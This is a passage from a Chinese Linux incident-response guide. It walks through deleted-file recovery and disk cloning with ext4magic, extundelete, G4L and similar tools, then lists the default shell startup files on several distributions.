`ext4magic /dev/sdb -rf /aaa/bbb/ccc.txt -d /opt/`

数据恢复成功，恢复后的数据按照原来的目录结构保存在 `-d` 指定的文件夹下

 - 全量数据恢复

`-M` 恢复全部文件

`-m` 恢复全部被删除的文件

除非你是一个分区挂了，不然不建议直接使用这两个参数，因为这个参数可以配合更牛的基于时间的参数来做某个时间点以前或者某个时间点以后的全量数据恢复

 - 基于时间的数据恢复

`-a` 时间戳    a 代表 after，表示在这个时间点以后

`-b` 时间戳      b 代表 before，表示在这个时间点以前

时间戳可以通过 `https://shijianchuo.net/` 这个网站进行时间和时间戳的转换

假设我们想把 2022 年 1 月 1 日以后删除的文件都恢复一下

`ext4magic /dev/sdb -a 1640966400 -d /opt/backup -m`

可以看到我们上面恢复的 aaa/bbb/ccc.txt 文件还在，但是之前几个工具做演示的文件，比如 test1.txt、test2.txt 已经恢复不了了，因为他们已经被我们新创建的文件和文件夹给覆盖了

现在我想恢复最近三天的数据，我还要用时间一点一点去算吗？ 不用

最近三天也就是三天前的此刻 以后的文件都要

`ext4magic /dev/sdb -a $(date -d "-3day" +%s) -d /opt/backup -m`

有趣的是，ext4magic 官方的man手册里还犯了一点儿小错误

 - 快速获取文件列表

之前我们从根目录开始，一层一层找 ccc.txt ，作为一个这么先进的工具，是不是可以直接把所有的目录和文件都显示出来呢，我们好通过 grep 来进行查找

`ext4magic /dev/sdb -Lx -f /`

如果你觉得，你对这里的 bdir 不感兴趣，你就是想看 aaa 目录里的，那就把 `-f /`换成 `-f /aaa/`

`ext4magic /dev/sdb -Lx -f /aaa`

 - 直观地看文件覆盖情况

可以使用 `-l` 参数列出来指定目录还没有被覆盖的文件

前面数字是 100% 的表示还没有被覆盖

很推荐这个工具

### Extundelete

http://extundelete.sourceforge.net/

支持 ext3、ext4

安装 Extundelete

`apt install extundelete`

现在 `/dev/sdb1` 挂载在 `/opt/project`下，我们在这个目录下创建一个文件 `test1.txt`

我们删除 `test1.txt` 并使用 `Ext3grep` 进行文件恢复

 - 卸载 `test1.txt` 所在分区

`umount /dev/sdb1`

 - 扫描指定文件系统的根路径

`extundelete --inode 2 /dev/sdb1`

/dev/sdb1 是本次实验的文件系统，大家按照实际情况替换就好

--inode 2 是指根路径

可以看到成功找到了 `test1.txt` ，就在这个文件系统的根目录下，后面标识这是一个被删除的文件

 - 恢复被删除的文件 `test1.txt`

`extundelete --restore-inode 12 /dev/sdb1 -o backup`

或者

`extundelete --restore-file test1.txt /dev/sdb1 -o backup`

可以看到，两种方式都成功恢复了文件，其中 `--restore-inode 12` 中的 12 是通过上图查询到的 `test1.txt` 对应的 `inode`; `-o` 参数指定一个文件夹名字，`extundelete` 会以这个名字在你执行 `extundelete` 命令的路径下新建文件夹。

 - 恢复多个文件、全量恢复

 - `--restore-files 'path'`
 - `--restore-directory`
 - `--restore-all`

这次我们新建一个目录 `t1`,之后再创建三个文本文件，之后把它们删除

`extundelete --inode 2 /dev/sdb1`

因为我们没有删除 `t1` 这个目录，所以 t1 没有显示删除，但是吧，这里也看不出来 t1 是文件还是目录，也看不到 t1 里面有什么，所以我们试着指定 t1 这个目录的 inode 360449

`extundelete --inode 360449 /dev/sdb1`

可以看到，我们被删除的三个文件，我们试着通过上面的几个参数来进行恢复

先来用之前的 `--restore-file`

试试  `--restore-files`

这个参数没用明白

试试 `--restore-directory`

`extundelete --restore-directory t1/ /dev/sdb1 -o backup`

试试 `--restore-all`,这个就是全量恢复了

`extundelete --restore-all /dev/sdb1 -o backup`

 - 恢复某个时间段的文件

`--after 时间戳`

`--before 时间戳`

可以通过下面这个网站完成时间戳和时间的转换，也可以通过 date命令来获取，后面会讲

https://shijianchuo.net/

`extundelete --after 1640966400 --restore-all /dev/sdb1 -o backup`

现在我想恢复最近三天的数据，我还要用时间一点一点去算吗？ 不用

最近三天也就是三天前的此刻 以后的文件都要

成功恢复。

 - 重新挂载分区

`mount /dev/sdb1 /opt/project`

### G4L

G4L 是一个硬盘和分区镜像和克隆工具。其实就是 Ghost for Linux 的意思

https://sourceforge.net/projects/g4l/

G4L有一定的弊端

 - 必须全盘克隆
 - 克隆即使源硬盘500G只装了1G的信息，目的硬盘也必须大于等于 500G（后面有实验）

 这个工具在2023年还更新了，这次演示就使用最新版本 G4L 0.62

假设受害系统只有一块硬盘，此时需要将其内容全部克隆下来，之后带走做更加深入的分析、取证等，受害系统信息如下

下载G4L

访问 https://sourceforge.net/projects/g4l/

解压zip，获取 iso 并烧录进U盘

本次演示选择 g4lefi 这个镜像，将其烧录进U盘（32G）

将受害系统关机，连接启动U盘，并设置U盘启动

此时插入数据盘 500G 硬盘（目的硬盘容量要大于源硬盘）

选择默认的这个

有几个这样的画面，一路回车就好，毕竟也没有其他选项

到这一步就要选择源和目的硬盘了

首先选择源驱动器（受害系统的硬盘）

通过上下键可以移动光标，使用空格选中本次要拷贝的 sdc 硬盘

选择目标驱动器（数据盘500G）

选择目的驱动器为 sdb ，也就是数据盘 500G硬盘

开始克隆

拷贝完成后就可以选择最下面的Reboot/Poweroff 进行关机

将数据盘拿回来会，在本地开始恢复系统

新建虚拟机

同样选择默认的第一个，同时接入数据盘 500G 硬盘

一路回车到这里

也使用默认的选项

输入 g4l 回车

选择默认的 RAW 模式

选择 Click'n'Cone,之后就到了熟悉的源目的驱动器选择界面

这回源驱动器就是数据盘500G硬盘了，目的驱动器就是新装的系统的硬盘

开始克隆

结果很尴尬，克隆进度直接停留在这个位置上了

新建的系统分配的硬盘是64G，而数据盘的大小是 500G ，讽刺的是实际上我们需要的数据只有16G

这就是在我们这种场景中，G4L 的弊端，它只能全盘备份，同时是将源硬盘容量的大小克隆给新硬盘，即使500G的硬盘只装了16G的数据，目标硬盘也必须大于等于500G

关机，将新系统硬盘（目的硬盘）容量扩大至 512G，再次克隆

经过了6-8 个小时后，拷贝完成，移除CD、启动U盘、数据盘

复制成功

### Linux Evidence Acquisition Framework

不要使用这个工具，可能会使系统出现故障，但是可以参考它的思路写一个自己的工具，代码就算了，这代码连异常都不处理

这个工具是一个取证工具，通过自定义的文件库对当前系统的响应文件进行复制，之后打包成ISO，还支持通过 yara 语法对文件进行匹配检查

很多时候，我们并不能关闭受害系统，而且只想获取部分文件的信息作为取证或者分析材料，这个工具本身自带了一份文件名单，同时支持自定义

 `// 更新索引
sudo apt update

// 安装pip3
sudo apt install python3-pip

// 升级pip3
pip3 install --upgrade pip

// 安装部分程序
sudo apt install python3-testresources
sudo apt install tree
sudo apt install mkisofs

// 下载 LEAF
git clone https://github.com/alex-cart/LEAF.git

// 安装 python3 依赖库，记得用sudo
cd LEAF
sudo pip3 install -r requirements.txt

// 开始使用，如果使用默认配置
sudo python3 LEAF_master.py
尽可能通过绝对地址来执行 LEAF_master.py
接下来等待进度条走完

// 如果不使用默认配置
-i filelist.txt
    可以指定需要采集的文件地址，具体地址文件书写方式可以直接查看当前目录下的 target_locations 文件，使用 -i 指定
-u root
    如果只想复制某个用户的文件信息，可以通过 -u root 这种形式来指定
-c SERVICES
    如果只想针对某一种信息进行收集，可以通过 -c xxx 来进行指定，具体可选参数为 APPLICATIONS, EXECUTIONS, LOGS, MISC, NETWORK, SHELL, STARTUP, SERVICES, SYSTEM, TRASH, USERS

更多参数可以查看 https://github.com/alex-cart/LEAF

```

查看一下默认的文件清单

一共195条，去掉第一行，一共 194 个文件夹及文件

现在通过默认的配置文件进行关键文件拷贝

思路挺好，但是不要用这个工具及其代码，我尝试加一些异常处理代码，最终系统还是难以避免挂掉的结果

### 查找某段时间内修改的文件(mtime)

`find /path/to/search -type f -newermt "2024-07-19 12:30:00" ! -newermt "2024-07-19 15:28:00" 2>/dev/null

```

### R-Linux

一个图形化的数据恢复应用

https://www.r-studio.com/free-linux-recovery-help/basicfilerecovery.html

ext2、ext3、ext4

虽然页面感人，但是还有中文支持

成功恢复文件内容

### TestDisk【测试恢复文件失败，不推荐】

https://www.cgsecurity.org/wiki/TestDisk_CN

支持操作系统 Windows、Linux、Mac

支持的文件系统

 - BeFS ( BeOS )
 - BSD disklabel ( FreeBSD/OpenBSD/NetBSD )
 - CramFS, 压缩文件系统
 - DOS/Windows FAT12, FAT16 和 FAT32
 - Windows exFAT
 - HFS, HFS+ 和 HFSX (Hierarchical File System)
 - JFS (IBM's Journaled File System)
 - Linux ext2, ext3 和ext4
 - Linux LUKS 加密分区
 - Linux RAID md 0.9/1.0/1.1/1.2
 - RAID 1: 镜像(Mirror)
 - RAID 4: 带容错的条带阵列
 - RAID 5: 带分布式冗余信息的条带阵列
 - RAID 6: 带分布式双冗余信息的条带阵列

 - Linux Swap (版本1 和 2)
 - LVM 和 LVM2, Linux逻辑卷管理器(Linux Logical Volume Manager)
 - Mac partition map
 - Novel NSS (Novell Storage Services)
 - NTFS ( Windows NT/2000/XP/2003/Vista/2008 )
 - ReiserFS 3.5, 3.6 和 4
 - Sun Solaris i386 disklabel
 - Unix文件系统-UFS and UFS2 (Sun/BSD/...)
 - XFS, SGI's Journaled File System

## 17. 知识点附录

> 原文：https://books.noptrace.com/linux/16.%E7%9F%A5%E8%AF%86%E7%82%B9%E9%99%84%E5%BD%95/

### 0x01 Linux 守护进程｜进程组｜session(会话)｜job(作业)

本来没有想单拿出来写，但是越研究越深，所以单拿出来

在Linux中：

 - 打开terminal，也就是终端程序，之后可以获得一个shell
 - 通过ssh连接到linux的ssh-server 服务器，也可以获得一个shell

 通常我们都是通过以上两种方式来获得一个shell，之后运行程序的，此时我需要纠正一个概念，我们通常都说获得一个shell，本质上来说，我们获取了一个session（会话，以下session都是会话）

拿两种常见情况进行举例

### 0x02 Linux 启动项默认情况

【ubuntu server 16.04 64位】

 `systemctl list-unit-files --type=service | grep enabled

```

 `/etc/rc.local

```

 - /etc/rc.d/rc.local  无这个文件

 - /etc/rc.d/init.d/   无这个文件

 - chkconfig --list    无这个命令

 - /etc/bashrc  无这个文件

 - ~/.bash_profile 无这个文件

 `/etc/profile

```

 `~/.bashrc

```
 `# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
    # We have color support; assume it's compliant with Ecma-48
    # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
    # a case would tend to support setf rather than setaf.)
    color_prompt=yes
    else
    color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

```
 `~/.profile

```

 `~/.bash_logout

```

【Ubuntu Server 22.04 】`/etc/profile.d/*` 默认情况

 `/etc/profile.d/01-locale-fix.sh

```

 `/etc/profile.d/apps-bin-path.sh

```
 `# shellcheck shell=sh

# Expand $PATH to include the directory where snappy applications go.
snap_bin_path="/snap/bin"
if [ -n "${PATH##*${snap_bin_path}}" ] && [ -n "${PATH##*${snap_bin_path}:*}" ]; then
    export PATH="$PATH:${snap_bin_path}"
fi

# Ensure base distro defaults xdg path are set if nothing filed up some
# defaults yet.
if [ -z "$XDG_DATA_DIRS" ]; then
    export XDG_DATA_DIRS="/usr/local/share:/usr/share"
fi

# Desktop files (used by desktop environments within both X11 and Wayland) are
# looked for in XDG_DATA_DIRS; make sure it includes the relevant directory for
# snappy applications' desktop files.
snap_xdg_path="/var/lib/snapd/desktop"
if [ -n "${XDG_DATA_DIRS##*${snap_xdg_path}}" ] && [ -n "${XDG_DATA_DIRS##*${snap_xdg_path}:*}" ]; then
    export XDG_DATA_DIRS="${XDG_DATA_DIRS}:${snap_xdg_path}"
fi

```

 `/etc/profile.d/bash_completion.sh

```
 `# shellcheck shell=sh disable=SC1091,SC2039,SC2166
# Check for interactive bash and that we haven't already been sourced.
if [ "x${BASH_VERSION-}" != x -a "x${PS1-}" != x -a "x${BASH_COMPLETION_VERSINFO-}" = x ]; then

    # Check for recent enough version of bash.
    if [ "${BASH_VERSINFO[0]}" -gt 4 ] ||
        [ "${BASH_VERSINFO[0]}" -eq 4 -a "${BASH_VERSINFO[1]}" -ge 2 ]; then
        [ -r "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion" ] &&
            . "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"
        if shopt -q progcomp && [ -r /usr/share/bash-completion/bash_completion ]; then
            # Source completion code.
            . /usr/share/bash-completion/bash_completion
        fi
    fi

fi

```

 `/etc/profile.d/gawk.csh

```
 `alias gawkpath_default 'unsetenv AWKPATH; setenv AWKPATH `gawk -v x=AWKPATH "BEGIN {print ENVIRON[x]}"`'

alias gawkpath_prepend 'if (! $?AWKPATH) setenv AWKPATH ""; if ($AWKPATH == "") then; unsetenv AWKPATH; setenv AWKPATH `gawk -v x=AWKPATH "BEGIN {print ENVIRON[x]}"`; endif; setenv AWKPATH "\!*"":$AWKPATH"'

alias gawkpath_append 'if (! $?AWKPATH) setenv AWKPATH ""; if ($AWKPATH == "") then; unsetenv AWKPATH; setenv AWKPATH `gawk -v x=AWKPATH "BEGIN {print ENVIRON[x]}"`; endif; setenv AWKPATH "$AWKPATH"":\!*"'

alias gawklibpath_default 'unsetenv AWKLIBPATH; setenv AWKLIBPATH `gawk -v x=AWKLIBPATH "BEGIN {print ENVIRON[x]}"`'

alias gawklibpath_prepend 'if (! $?AWKLIBPATH) setenv AWKLIBPATH ""; if ($AWKLIBPATH == "") then; unsetenv AWKLIBPATH; setenv AWKLIBPATH `gawk -v x=AWKLIBPATH "BEGIN {print ENVIRON[x]}"`; endif; setenv AWKLIBPATH "\!*"":$AWKLIBPATH"'

alias gawklibpath_append 'if (! $?AWKLIBPATH) setenv AWKLIBPATH ""; if ($AWKLIBPATH == "") then; unsetenv AWKLIBPATH; setenv AWKLIBPATH `gawk -v x=AWKLIBPATH "BEGIN {print ENVIRON[x]}"`; endif; setenv AWKLIBPATH "$AWKLIBPATH"":\!*"'

```

 `/etc/profile.d/gawk.sh

```
 `gawkpath_default () {
    unset AWKPATH
    export AWKPATH=`gawk 'BEGIN {print ENVIRON["AWKPATH"]}'`
}

gawkpath_prepend () {
    [ -z "$AWKPATH" ] && AWKPATH=`gawk 'BEGIN {print ENVIRON["AWKPATH"]}'`
    export AWKPATH="$*:$AWKPATH"
}

gawkpath_append () {
    [ -z "$AWKPATH" ] && AWKPATH=`gawk 'BEGIN {print ENVIRON["AWKPATH"]}'`
    export AWKPATH="$AWKPATH:$*"
}

gawklibpath_default () {
    unset AWKLIBPATH
    export AWKLIBPATH=`gawk 'BEGIN {print ENVIRON["AWKLIBPATH"]}'`
}

gawklibpath_prepend () {
    [ -z "$AWKLIBPATH" ] && \
        AWKLIBPATH=`gawk 'BEGIN {print ENVIRON["AWKLIBPATH"]}'`
    export AWKLIBPATH="$*:$AWKLIBPATH"
}

gawklibpath_append () {
    [ -z "$AWKLIBPATH" ] && \
        AWKLIBPATH=`gawk 'BEGIN {print ENVIRON["AWKLIBPATH"]}'`
    export AWKLIBPATH="$AWKLIBPATH:$*"
}

```

 `cat /etc/profile.d/Z97-byobu.sh

```
 `#    Z97-byobu.sh - allow any user to opt into auto-launching byobu
#    Copyright (C) 2011 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@byobu.org>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, version 3 of the License.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

# Allow any user to opt into auto-launching byobu by setting LC_BYOBU=1
# Apologies for borrowing the LC_BYOBU namespace, but:
#  a) it's reasonable to assume that no one else is using LC_BYOBU
#  b) LC_* is sent and receieved by most /etc/ssh/ssh*_config

if [ -r "/usr/bin/byobu-launch" ]; then
    if [ "$LC_BYOBU" = "0" ]; then
        true
    elif [ "$LC_BYOBU" = "1" ]; then
        . /usr/bin/byobu-launch
    elif [ -e "/etc/byobu/autolaunch" ]; then
        . /usr/bin/byobu-launch
    elif [ "$LC_TERMTYPE" = "byobu" ]; then
        . /usr/bin/byobu-launch
    elif [ "$LC_TERMTYPE" = "byobu-screen" ]; then
        export BYOBU_BACKEND="screen"
        . /usr/bin/byobu-launch
    elif [ "$LC_TERMTYPE" = "byobu-tmux" ]; then
        export BYOBU_BACKEND="tmux"
        . /usr/bin/byobu-launch
    fi
fi

# vi: syntax=sh ts=4 noexpandtab

```

 `/etc/profile.d/Z99-cloudinit-warnings.sh

```
 `#!/bin/sh
# This file is part of cloud-init. See LICENSE file for license information.

# Purpose: show user warnings on login.

cloud_init_warnings() {
    command -v local >/dev/null && local _local="local" ||
        typeset _local="typeset"
    $_local warning="" idir="/var/lib/cloud/instance" n=0
    $_local warndir="$idir/warnings"
    $_local ufile="$HOME/.cloud-warnings.skip" sfile="$warndir/.skip"
    [ -d "$warndir" ] || return 0
    [ ! -f "$ufile" ] || return 0
    [ ! -f "$sfile" ] || return 0

    for warning in "$warndir"/*; do
        [ -f "$warning" ] || continue
        cat "$warning"
        n=$((n+1))
    done
    [ $n -eq 0 ] && return 0
    echo ""
    echo "Disable the warnings above by:"
    echo "  touch $ufile"
    echo "or"
    echo "  touch $sfile"
}

cloud_init_warnings 1>&2
unset cloud_init_warnings

```

 `/etc/profile.d/Z99-cloud-locale-test.sh

```
 `#!/bin/sh
# Copyright (C) 2012, Canonical Group, Ltd.
#
# Author: Ben Howard <ben.howard@canonical.com>
# Author: Scott Moser <scott.moser@ubuntu.com>
# (c) 2012, Canonical Group, Ltd.
#
# This file is part of cloud-init. See LICENSE file for license information.

# Purpose: Detect invalid locale settings and inform the user
#  of how to fix them.

locale_warn() {
    command -v local >/dev/null && local _local="local" ||
        typeset _local="typeset"

    $_local bad_names="" bad_lcs="" key="" val="" var="" vars="" bad_kv=""
    $_local w1 w2 w3 w4 remain

    # if shell is zsh, act like sh only for this function (-L).
    # The behavior change will not permanently affect user's shell.
    [ "${ZSH_NAME+zsh}" = "zsh" ] && emulate -L sh

    # locale is expected to output either:
    # VARIABLE=
    # VARIABLE="value"
    # locale: Cannot set LC_SOMETHING to default locale
    while read -r w1 w2 w3 w4 remain; do
        case "$w1" in
            locale:) bad_names="${bad_names} ${w4}";;
            *)
                key=${w1%%=*}
                val=${w1#*=}
                val=${val#\"}
                val=${val%\"}
                vars="${vars} $key=$val";;
        esac
    done
    for bad in $bad_names; do
        for var in ${vars}; do
            [ "${bad}" = "${var%=*}" ] || continue
            val=${var#*=}
            [ "${bad_lcs#* ${val}}" = "${bad_lcs}" ] &&
                bad_lcs="${bad_lcs} ${val}"
            bad_kv="${bad_kv} $bad=$val"
            break
        done
    done
    bad_lcs=${bad_lcs# }
    bad_kv=${bad_kv# }
    [ -n "$bad_lcs" ] || return 0

    printf "_____________________________________________________________________\n"
    printf "WARNING! Your environment specifies an invalid locale.\n"
    printf " The unknown environment variables are:\n   %s\n" "$bad_kv"
    printf " This can affect your user experience significantly, including the\n"
    printf " ability to manage packages. You may install the locales by running:\n\n"

    $_local bad invalid="" to_gen="" sfile="/usr/share/i18n/SUPPORTED"
    $_local local pkgs=""
    if [ -e "$sfile" ]; then
        for bad in ${bad_lcs}; do
            grep -q -i "${bad}" "$sfile" &&
                to_gen="${to_gen} ${bad}" ||
                invalid="${invalid} ${bad}"
        done
    else
        printf "  sudo apt-get install locales\n"
        to_gen=$bad_lcs
    fi
    to_gen=${to_gen# }

    $_local pkgs=""
    for bad in ${to_gen}; do
        pkgs="${pkgs} language-pack-${bad%%_*}"
    done
    pkgs=${pkgs# }

    if [ -n "${pkgs}" ]; then
        printf "   sudo apt-get install ${pkgs# }\n"
        printf "     or\n"
        printf "   sudo locale-gen ${to_gen# }\n"
        printf "\n"
    fi
    for bad in ${invalid}; do
        printf "WARNING: '${bad}' is an invalid locale\n"
    done

    printf "To see all available language packs, run:\n"
    printf "   apt-cache search \"^language-pack-[a-z][a-z]$\"\n"
    printf "To disable this message for all users, run:\n"
    printf "   sudo touch /var/lib/cloud/instance/locale-check.skip\n"
    printf "_____________________________________________________________________\n\n"

    # only show the message once
    : > ~/.cloud-locale-test.skip 2>/dev/null || :
}

[ -f ~/.cloud-locale-test.skip -o -f /var/lib/cloud/instance/locale-check.skip ] ||
    locale 2>&1 | locale_warn

unset locale_warn

```

【Centos 7 64位】

 `systemctl list-unit-files --type=service | grep enabled

```

 `abrt-ccpp.service                             enabled
abrt-oops.service                             enabled
abrt-vmcore.service                           enabled
abrt-xorg.service                             enabled
abrtd.service                                 enabled
accounts-daemon.service                       enabled
atd.service                                   enabled
auditd.service                                enabled
autovt@.service                               enabled
avahi-daemon.service                          enabled
bluetooth.service                             enabled
chronyd.service                               enabled
crond.service                                 enabled
cups.service                                  enabled
dbus-org.bluez.service                        enabled
dbus-org.fedoraproject.FirewallD1.service     enabled
dbus-org.freedesktop.Avahi.service            enabled
dbus-org.freedesktop.ModemManager1.service    enabled
dbus-org.freedesktop.nm-dispatcher.service    enabled
display-manager.service                       enabled
dmraid-activation.service                     enabled
firewalld.service                             enabled
gdm.service                                   enabled
getty@.service                                enabled
initial-setup-reconfiguration.service         enabled
irqbalance.service                            enabled
iscsi.service                                 enabled
kdump.service                                 enabled
libstoragemgmt.service                        enabled
lvm2-monitor.service                          enabled
mdmonitor.service                             enabled
microcode.service                             enabled
ModemManager.service                          enabled
multipathd.service                            enabled
NetworkManager-dispatcher.service             enabled
NetworkManager-wait-online.service            enabled
NetworkManager.service                        enabled
postfix.service                               enabled
qemu-guest-agent.service                      enabled
rhel-autorelabel-mark.service                 enabled
rhel-autorelabel.service                      enabled
rhel-configure.service                        enabled
rhel-dmesg.service                            enabled
rhel-domainname.service                       enabled
rhel-import-state.service                     enabled
rhel-loadmodules.service                      enabled
rhel-readonly.service                         enabled
rngd.service                                  enabled
rpcbind.service                               enabled
rsyslog.service                               enabled
rtkit-daemon.service                          enabled
smartd.service                                enabled
sysstat.service                               enabled
systemd-readahead-collect.service             enabled
systemd-readahead-drop.service                enabled
systemd-readahead-replay.service              enabled
tuned.service                                 enabled
udisks2.service                               enabled
vdo.service                                   enabled
vgauthd.service                               enabled
vmtoolsd.service                              enabled

```
 `/etc/rc.local

```

 `/etc/rc.d/rc.local

```

 `/etc/rc.d/init.d/

```

 `chkconfig --list

```

 `/etc/profile

```

 `# /etc/profile

# System wide environment and startup programs, for login setup
# Functions and aliases go in /etc/bashrc

# It's NOT a good idea to change this file unless you know what you
# are doing. It's much better to create a custom.sh shell script in
# /etc/profile.d/ to make custom changes to your environment, as this
# will prevent the need for merging in future updates.

pathmunge () {
    case ":${PATH}:" in
        *:"$1":*)
            ;;
        *)
            if [ "$2" = "after" ] ; then
                PATH=$PATH:$1
            else
                PATH=$1:$PATH
            fi
    esac
}

if [ -x /usr/bin/id ]; then
    if [ -z "$EUID" ]; then
        # ksh workaround
        EUID=`/usr/bin/id -u`
        UID=`/usr/bin/id -ru`
    fi
    USER="`/usr/bin/id -un`"
    LOGNAME=$USER
    MAIL="/var/spool/mail/$USER"
fi

# Path manipulation
if [ "$EUID" = "0" ]; then
    pathmunge /usr/sbin
    pathmunge /usr/local/sbin
else
    pathmunge /usr/local/sbin after
    pathmunge /usr/sbin after
fi

HOSTNAME=`/usr/bin/hostname 2>/dev/null`
HISTSIZE=1000
if [ "$HISTCONTROL" = "ignorespace" ] ; then
    export HISTCONTROL=ignoreboth
else
    export HISTCONTROL=ignoredups
fi

export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTROL

# By default, we want umask to get set. This sets it for login shell
# Current threshold for system reserved uid/gids is 200
# You could check uidgid reservation validity in
# /usr/share/doc/setup-*/uidgid file
if [ $UID -gt 199 ] && [ "`/usr/bin/id -gn`" = "`/usr/bin/id -un`" ]; then
    umask 002
else
    umask 022
fi

for i in /etc/profile.d/*.sh /etc/profile.d/sh.local ; do
    if [ -r "$i" ]; then
        if [ "${-#*i}" != "$-" ]; then
            . "$i"
        else
            . "$i" >/dev/null
        fi
    fi
done

unset i
unset -f pathmunge

```
 `/etc/bashrc

```

 `~/.bashrc

```

 `~/.bash_profile

```

 - ~/.profile  无这个文件

 `~/.bash_logout

```

【Rocky Linux 9.1】`/etc/profile.d/*` 默认情况

 `/etc/profile.d/bash_completion.sh

```
 `# shellcheck shell=sh disable=SC1091,SC2039,SC2166
# Check for interactive bash and that we haven't already been sourced.
if [ "x${BASH_VERSION-}" != x -a "x${PS1-}" != x -a "x${BASH_COMPLETION_VERSINFO-}" = x ]; then

    # Check for recent enough version of bash.
    if [ "${BASH_VERSINFO[0]}" -gt 4 ] ||
        [ "${BASH_VERSINFO[0]}" -eq 4 -a "${BASH_VERSINFO[1]}" -ge 2 ]; then
        [ -r "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion" ] &&
            . "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"
        if shopt -q progcomp && [ -r /usr/share/bash-completion/bash_completion ]; then
            # Source completion code.
            . /usr/share/bash-completion/bash_completion
        fi
    fi

fi

```

 `/etc/profile.d/bash_completion.sh

```
 `# shellcheck shell=sh disable=SC1091,SC2039,SC2166
# Check for interactive bash and that we haven't already been sourced.
if [ "x${BASH_VERSION-}" != x -a "x${PS1-}" != x -a "x${BASH_COMPLETION_VERSINFO-}" = x ]; then

    # Check for recent enough version of bash.
    if [ "${BASH_VERSINFO[0]}" -gt 4 ] ||
        [ "${BASH_VERSINFO[0]}" -eq 4 -a "${BASH_VERSINFO[1]}" -ge 2 ]; then
        [ -r "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion" ] &&
            . "${XDG_CONFIG_HOME:-$HOME/.config}/bash_completion"
        if shopt -q progcomp && [ -r /usr/share/bash-completion/bash_completion ]; then
            # Source completion code.
            . /usr/share/bash-completion/bash_completion
        fi
    fi

fi
[root@localhost ~]# cat /etc/profile.d/colorgrep.csh

# color-grep initialization

/usr/libexec/grepconf.sh -c
if ( $status == 1 ) then
    exit
endif

alias grep 'grep --color=auto'
alias egrep 'egrep --color=auto'
alias fgrep 'fgrep --color=auto'

```

 `/etc/profile.d/colorgrep.sh

```
 `# color-grep initialization

/usr/libexec/grepconf.sh -c
if ( $status == 1 ) then
    exit
endif

alias grep 'grep --color=auto'
alias egrep 'egrep --color=auto'
alias fgrep 'fgrep --color=auto'
[root@localhost ~]# cat /etc/profile.d/colorgrep.sh
# color-grep initialization

/usr/libexec/grepconf.sh -c || return

alias grep='grep --color=auto' 2>/dev/null
alias egrep='egrep --color=auto' 2>/dev/null
alias fgrep='fgrep --color=auto' 2>/dev/null

```

 `/etc/profile.d/colorls.csh

```
 `# color-grep initialization

/usr/libexec/grepconf.sh -c || return

